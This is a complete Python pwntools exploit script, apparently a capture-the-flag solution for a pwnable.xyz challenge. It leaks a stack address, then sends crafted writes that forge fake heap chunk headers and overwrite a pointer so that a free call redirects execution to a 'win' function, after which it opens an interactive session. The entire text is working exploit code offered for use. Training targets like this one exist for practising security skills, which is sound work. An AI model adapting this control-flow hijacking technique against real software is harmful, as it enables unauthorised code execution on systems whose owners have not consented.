from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30005)

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def free():
	init(0)

def read(data):
	init(1)
	target.send(data)

def leak():
	init(2)
	leak=target.recvline().strip("\n")
	return leak

def mov():
	time.sleep(1)
	init(3)
	
win=0x400A3E
stack_leak=int(leak()[2:],16)
print(hex(stack_leak))

read("A"*0x8+p64(stack_leak+8*10)+p64(0)*2)
mov()
read("A"*0x8+p64(stack_leak+8*9)+"A"*8+p64(0x21))
mov()
read(p64(0x21)+p64(stack_leak+8*10)+p64(win)+"A"*8)
mov()
free()

target.interactive()
